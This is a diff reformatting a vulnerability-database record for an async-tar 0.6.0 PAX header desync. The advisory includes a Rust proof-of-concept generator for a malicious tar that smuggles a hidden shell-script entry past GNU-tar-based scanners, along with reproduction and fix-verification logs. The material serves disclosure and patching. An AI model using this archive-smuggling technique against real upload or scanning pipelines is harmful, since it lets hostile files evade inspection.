@@ -1,10 +1,6 @@
-[id]
-ave_id = "AVE-2026-0417"
-aliases = ["CVE-2026-53600","GHSA-35rm-7j9c-2f7m"]
-
 [basic]
-title = "async-tar PAX extension-header desync enables tar entry/content smuggling"
-description = "## Summary
+description = '''
+## Summary
 
 `async-tar` v0.6.0 mis-applies a buffered PAX `size` extension to an intermediary
 extension header (a GNU longname `L`, a GNU longlink `K`, or a PAX `x`/`g`
@@ -49,17 +45,17 @@ commit `45814b19295b7398e119c90c57d8c8bf70a798b6`):
     if let Some(pax_extensions_data) = pax_extensions_data {   // <-- no is_extension_header guard
         let pax = pax_extensions(pax_extensions_data);
         for extension in pax {
-            let extension = extension.map_err(|_e| other(\"pax extensions invalid\"))?;
+            let extension = extension.map_err(|_e| other("pax extensions invalid"))?;
             let Some(key) = extension.key().ok() else { continue };
             match key {
-                \"size\" => {
+                "size" => {
                     let size_str = extension.value()
-                        .map_err(|_e| other(\"failed to parse pax size as string\"))?;
+                        .map_err(|_e| other("failed to parse pax size as string"))?;
                     size = size_str.parse::<u64>()
-                        .map_err(|_e| other(\"failed to parse pax size\"))?;
+                        .map_err(|_e| other("failed to parse pax size"))?;
                 }
-                \"uid\" => { let v = extension.value().unwrap(); header.set_uid(v.parse().unwrap()); }
-                \"gid\" => { let v = extension.value().unwrap(); header.set_gid(v.parse().unwrap()); }
+                "uid" => { let v = extension.value().unwrap(); header.set_uid(v.parse().unwrap()); }
+                "gid" => { let v = extension.value().unwrap(); header.set_gid(v.parse().unwrap()); }
                 _ => { continue }
             }
         }
@@ -126,7 +122,7 @@ archive-scan/preview pipelines.
 ## Proof of concept
 
 A standalone Rust consumer binary that links the published crates.io
-`async-tar = \"=0.6.0\"` (`default-features = false, features = [\"runtime-tokio\"]`)
+`async-tar = "=0.6.0"` (`default-features = false, features = ["runtime-tokio"]`)
 and runs the real `Archive::new(...).entries()` extraction loop (the same shape
 used by real downstream server consumers that unpack uploaded tarballs). It reads
 a tar file and writes each entry to a destination directory, printing the entry
@@ -137,13 +133,13 @@ Malicious archive geometry (block = 512 bytes):
 
 ```
 B0  x  PAX local-extension header, records declare size=1024 (= 2 blocks)
-B1     PAX records  (\"<len> size=1024\n\")
+B1     PAX records  ("<len> size=1024\n")
 B2  L  GNU longname header, OWN declared size = 512 (= 1 block)
-B3     longname block #1  = \"GNU_SEES_THIS.txt\0...\"   (the name GNU tar uses)
-B4     a normal file header \"placeholder_A\" (size 512)
+B3     longname block #1  = "GNU_SEES_THIS.txt\0..."   (the name GNU tar uses)
+B4     a normal file header "placeholder_A" (size 512)
 B5     <-- this block IS a valid tar header for the smuggled file
-           \"hidden_payload.sh\" (size 65)
-B6     smuggled payload  \"#!/bin/sh\n# SMUGGLED ENTRY...\n\"
+           "hidden_payload.sh" (size 65)
+B6     smuggled payload  "#!/bin/sh\n# SMUGGLED ENTRY...\n"
 B7,B8  two zero blocks (EOF)
 ```
 
@@ -161,7 +157,7 @@ use std::io::Write;
 const BLOCK: usize = 512;
 
 fn octal(buf: &mut [u8], v: u64) {
-    let s = format!(\"{:0width$o}\", v, width = buf.len() - 1);
+    let s = format!("{:0width$o}", v, width = buf.len() - 1);
     let b = s.as_bytes();
     buf[..b.len()].copy_from_slice(b);
     buf[b.len()] = 0;
@@ -177,11 +173,11 @@ fn header(name: &[u8], size: u64, typeflag: u8) -> [u8; BLOCK] {
     octal(&mut h[124..136], size);
     octal(&mut h[136..148], 0);
     h[156] = typeflag;
-    if typeflag == b'L' { h[257..265].copy_from_slice(b\"ustar  \0\"); }
-    else { h[257..263].copy_from_slice(b\"ustar\0\"); h[263..265].copy_from_slice(b\"00\"); }
+    if typeflag == b'L' { h[257..265].copy_from_slice(b"ustar  \0"); }
+    else { h[257..263].copy_from_slice(b"ustar\0"); h[263..265].copy_from_slice(b"00"); }
     for b in &mut h[148..156] { *b = b' '; }
     let sum: u32 = h.iter().map(|b| *b as u32).sum();
-    h[148..156].copy_from_slice(format!(\"{:06o}\0 \", sum).as_bytes());
+    h[148..156].copy_from_slice(format!("{:06o}\0 ", sum).as_bytes());
     h
 }
 
@@ -192,7 +188,7 @@ fn pad(out: &mut Vec<u8>, len: usize) {
 fn pax_record(key: &str, val: &str) -> Vec<u8> {
     let mut len = key.len() + val.len() + 3;
     loop {
-        let s = format!(\"{} {}={}\n\", len, key, val);
+        let s = format!("{} {}={}\n", len, key, val);
         if s.len() == len { return s.into_bytes(); }
         len = s.len();
     }
@@ -202,17 +198,17 @@ fn write_block(out: &mut Vec<u8>, data: &[u8]) { out.extend_from_slice(data); pa
 
 fn build_malicious() -> Vec<u8> {
     let mut out = Vec::new();
-    let gnu_name = b\"GNU_SEES_THIS.txt\";
+    let gnu_name = b"GNU_SEES_THIS.txt";
     let spoof = (BLOCK * 2) as u64;
     let mut recs = Vec::new();
-    recs.extend(pax_record(\"size\", &spoof.to_string()));
-    out.extend_from_slice(&header(b\"./PaxHeaders/0\", recs.len() as u64, b'x'));
+    recs.extend(pax_record("size", &spoof.to_string()));
+    out.extend_from_slice(&header(b"./PaxHeaders/0", recs.len() as u64, b'x'));
     write_block(&mut out, &recs);
-    out.extend_from_slice(&header(b\"././@LongLink\", BLOCK as u64, b'L'));
+    out.extend_from_slice(&header(b"././@LongLink", BLOCK as u64, b'L'));
     out.extend_from_slice(&name_block(gnu_name));                 // B3
-    out.extend_from_slice(&header(b\"placeholder_A\", BLOCK as u64, b'0')); // B4
-    let smuggled_body = b\"#!/bin/sh\n# SMUGGLED ENTRY: invisible to a GNU-tar-based scanner\n\".to_vec();
-    out.extend_from_slice(&header(b\"hidden_payload.sh\", smuggled_body.len() as u64, b'0')); // B5
+    out.extend_from_slice(&header(b"placeholder_A", BLOCK as u64, b'0')); // B4
+    let smuggled_body = b"#!/bin/sh\n# SMUGGLED ENTRY: invisible to a GNU-tar-based scanner\n".to_vec();
+    out.extend_from_slice(&header(b"hidden_payload.sh", smuggled_body.len() as u64, b'0')); // B5
     write_block(&mut out, &smuggled_body);                        // B6
     out.extend(std::iter::repeat(0u8).take(BLOCK * 2));
     out
@@ -221,14 +217,14 @@ fn build_malicious() -> Vec<u8> {
 fn build_benign() -> Vec<u8> {
     let mut out = Vec::new();
     let mut recs = Vec::new();
-    recs.extend(pax_record(\"path\", \"normal_file.txt\"));
-    out.extend_from_slice(&header(b\"./PaxHeaders/0\", recs.len() as u64, b'x'));
+    recs.extend(pax_record("path", "normal_file.txt"));
+    out.extend_from_slice(&header(b"./PaxHeaders/0", recs.len() as u64, b'x'));
     write_block(&mut out, &recs);
-    let body = b\"plain benign content\n\".to_vec();
-    out.extend_from_slice(&header(b\"normal_file.txt\", body.len() as u64, b'0'));
+    let body = b"plain benign content\n".to_vec();
+    out.extend_from_slice(&header(b"normal_file.txt", body.len() as u64, b'0'));
     write_block(&mut out, &body);
-    let body2 = b\"second benign file\n\".to_vec();
-    out.extend_from_slice(&header(b\"second.txt\", body2.len() as u64, b'0'));
+    let body2 = b"second benign file\n".to_vec();
+    out.extend_from_slice(&header(b"second.txt", body2.len() as u64, b'0'));
     write_block(&mut out, &body2);
     out.extend(std::iter::repeat(0u8).take(BLOCK * 2));
     out
@@ -236,7 +232,7 @@ fn build_benign() -> Vec<u8> {
 
 fn main() {
     let a: Vec<String> = std::env::args().collect();
-    let bytes = match a[1].as_str() { \"malicious\" => build_malicious(), \"benign\" => build_benign(), _ => std::process::exit(2) };
+    let bytes = match a[1].as_str() { "malicious" => build_malicious(), "benign" => build_benign(), _ => std::process::exit(2) };
     std::fs::File::create(&a[2]).unwrap().write_all(&bytes).unwrap();
 }
 ```
@@ -249,19 +245,19 @@ use tokio::fs;
 use tokio::io::AsyncReadExt;
 use tokio_stream::StreamExt;
 
-#[tokio::main(flavor = \"multi_thread\", worker_threads = 2)]
+#[tokio::main(flavor = "multi_thread", worker_threads = 2)]
 async fn main() {
     let args: Vec<String> = std::env::args().collect();
     let dest = std::path::PathBuf::from(&args[2]);
     fs::create_dir_all(&dest).await.unwrap();
     let bytes = fs::read(&args[1]).await.unwrap();
     let archive = Archive::new(std::io::Cursor::new(bytes));
-    let mut entries = archive.entries().expect(\"entries()\");
+    let mut entries = archive.entries().expect("entries()");
     let mut idx = 0usize;
     while let Some(entry) = entries.next().await {
-        let mut file = match entry { Ok(f) => f, Err(e) => { println!(\"[async-tar] ERROR: {e}\"); break } };
-        let path_raw = file.path().expect(\"path\").into_owned();
-        let path_disp = path_raw.to_string_lossy().split('\u{0}').next().unwrap_or(\"\").to_string();
+        let mut file = match entry { Ok(f) => f, Err(e) => { println!("[async-tar] ERROR: {e}"); break } };
+        let path_raw = file.path().expect("path").into_owned();
+        let path_disp = path_raw.to_string_lossy().split('\u{0}').next().unwrap_or("").to_string();
         let hdr_size = file.header().size().unwrap_or(0);
         let mut out = dest.clone();
         for comp in std::path::PathBuf::from(&path_disp).components() {
@@ -273,10 +269,10 @@ async fn main() {
         let _ = fs::write(&out, &body).await;
         let preview: String = body.iter().take(48)
             .map(|b| if b.is_ascii_graphic() || *b == b' ' { *b as char } else { '.' }).collect();
-        println!(\"[async-tar] entry#{idx} path={:?} hdr_size={hdr_size} bytes_read={read} body=\\"{preview}\\"\", path_disp);
+        println!("[async-tar] entry#{idx} path={:?} hdr_size={hdr_size} bytes_read={read} body=\"{preview}\"", path_disp);
         idx += 1;
     }
-    println!(\"[async-tar] total entries surfaced: {idx}\");
+    println!("[async-tar] total entries surfaced: {idx}");
 }
 ```
 
@@ -284,10 +280,10 @@ async fn main() {
 
 ```toml
 [dependencies]
-async-tar = { version = \"=0.6.0\", default-features = false, features = [\"runtime-tokio\"] }
-tokio = { version = \"1\", features = [\"rt-multi-thread\", \"macros\", \"io-util\", \"fs\"] }
-tokio-stream = \"0.1\"
-futures = \"0.3\"
+async-tar = { version = "=0.6.0", default-features = false, features = ["runtime-tokio"] }
+tokio = { version = "1", features = ["rt-multi-thread", "macros", "io-util", "fs"] }
+tokio-stream = "0.1"
+futures = "0.3"
 ```
 
 ## End-to-end reproduction
@@ -305,10 +301,10 @@ $ ./target/release/mktar malicious mal.tar
 wrote 4608 bytes to mal.tar
 
 # ---- (A) GNU tar reference: list + extract ----
-$ gtar tvf mal.tar ; echo \"rc=$?\"
+$ gtar tvf mal.tar ; echo "rc=$?"
 -rw-r--r-- 0/0            1024 1970-01-01 08:00 GNU_SEES_THIS.txt
 rc=0
-$ gtar xf mal.tar -C /tmp/gnu_x ; echo \"rc=$?\"
+$ gtar xf mal.tar -C /tmp/gnu_x ; echo "rc=$?"
 rc=0
 $ head -c 80 /tmp/gnu_x/GNU_SEES_THIS.txt
 hidden_payload.sh
@@ -317,7 +313,7 @@ hidden_payload.sh
 
 # ---- (B) async-tar v0.6.0 consumer: extract ----
 $ ./target/release/extract mal.tar /tmp/at_mal
-[async-tar] entry#0 path=\"GNU_SEES_THIS.txt\" hdr_size=65 bytes_read=1024 body=\"#!/bin/sh.# SMUGGLED ENTRY: invisible to a GNU-t\"
+[async-tar] entry#0 path="GNU_SEES_THIS.txt" hdr_size=65 bytes_read=1024 body="#!/bin/sh.# SMUGGLED ENTRY: invisible to a GNU-t\"
 [async-tar] total entries surfaced: 1
 $ head -c 80 /tmp/at_mal/GNU_SEES_THIS.txt
 #!/bin/sh
@@ -334,13 +330,13 @@ following file, no intermediary `L`):
 
 ```
 $ ./target/release/mktar benign ben.tar
-$ gtar tvf ben.tar ; echo \"rc=$?\"
+$ gtar tvf ben.tar ; echo "rc=$?"
 -rw-r--r-- 0/0              21 1970-01-01 08:00 normal_file.txt
 -rw-r--r-- 0/0              19 1970-01-01 08:00 second.txt
 rc=0
 $ ./target/release/extract ben.tar /tmp/at_ben
-[async-tar] entry#0 path=\"normal_file.txt\" hdr_size=21 bytes_read=21 body=\"plain benign content.\"
-[async-tar] entry#1 path=\"second.txt\" hdr_size=19 bytes_read=19 body=\"second benign file.\"
+[async-tar] entry#0 path="normal_file.txt" hdr_size=21 bytes_read=21 body="plain benign content."
+[async-tar] entry#1 path="second.txt" hdr_size=19 bytes_read=19 body="second benign file."
 [async-tar] total entries surfaced: 2
 ```
 
@@ -383,12 +379,12 @@ Fix-verify, captured verbatim. The patched `async-tar` (guard added) re-run
 against the same `mal.tar`:
 
 ```
-$ cargo build --release        # [patch.crates-io] async-tar = { path = \"../async-tar-patched\" }
+$ cargo build --release        # [patch.crates-io] async-tar = { path = "../async-tar-patched" }
    Compiling async-tar v0.6.0 (.../async-tar-patched)
    Compiling async-tar-consumer v0.1.0
     Finished `release` profile [optimized] target(s)
 $ ./target/release/extract mal.tar /tmp/at_fix
-[async-tar] entry#0 path=\"GNU_SEES_THIS.txt\" hdr_size=512 bytes_read=1024 body=\"hidden_payload.sh...............................\"
+[async-tar] entry#0 path="GNU_SEES_THIS.txt" hdr_size=512 bytes_read=1024 body="hidden_payload.sh..............................."
 [async-tar] total entries surfaced: 1
 $ head -c 80 /tmp/at_fix/GNU_SEES_THIS.txt
 hidden_payload.sh
@@ -409,21 +405,30 @@ inheriting a following PAX `size`).
 
 ## Credit
 
-Reported by tonghuaroot."
-severity = "MEDIUM"
-score = 5
-sources = ["ghsa"]
-published = ""
-updated = ""
+Reported by tonghuaroot.
+'''
+published = "2026-01-01"
 remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "async-tar PAX extension-header desync enables tar entry/content smuggling"
+updated = "2026-01-01"
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = [
+    "CVE-2026-53600",
+    "GHSA-35rm-7j9c-2f7m",
+]
+ave_id = "AVE-2026-0417"
+
+[meta]
+collected_at = "2026-07-25T02:30:38.204127384+00:00"
+status = "completed"
 
 [references]
 urls = []
-
-[exploit]
-poc_urls = []
-exp_urls = []
-
-[meta]
-status = "completed"
-collected_at = "2026-07-25T02:30:38.204127384+00:00"
